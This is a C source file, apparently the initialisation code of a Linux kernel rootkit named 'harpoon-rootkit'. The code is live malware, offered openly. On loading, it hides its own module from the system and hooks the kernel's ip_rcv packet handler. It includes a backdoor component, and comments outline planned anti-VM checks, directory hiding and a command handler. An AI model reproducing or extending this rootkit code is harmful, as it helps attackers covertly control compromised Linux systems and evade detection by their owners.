#include <linux/init.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <net/ip.h>

#include "global.h"
#include "module/module.h"
#include "hooking/hooking.h"
#include "backdoor/backdoor.h"

struct harpoon_struct *harpoon;

void harpoon_global_init(void){
    harpoon = kmalloc(sizeof(struct harpoon_struct), GFP_KERNEL);
    INIT_LIST_HEAD(&harpoon->module_list);
    INIT_LIST_HEAD(&harpoon->hook_list);
}

/* Legit function */
int (*legit_ip_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
        struct net_device *orig_dev);

/* Rootkit entrypoint */
static int __init harpoon_init(void){

    // Anti VM

    // Init harpoon;
    harpoon_global_init();

    // Hide harpoon module
    harpoon_mod_hide(harpoon_new_mod(THIS_MODULE));

    // Hook ip_rcv
    legit_ip_rcv = ip_rcv;
    harpoon_hook(harpoon_new_hook("ip_rcv", harpoon_ip_rcv, ip_rcv, RECUR_DETECT));

    // Register io_uring operations

    // Hide harpoon directory

    // Start cmd handler

    return 0;
}

static void __exit harpoon_exit(void){
    return;
}

module_init(harpoon_init);
module_exit(harpoon_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("0xTen + shquish");
MODULE_DESCRIPTION("harpoon-rootkit");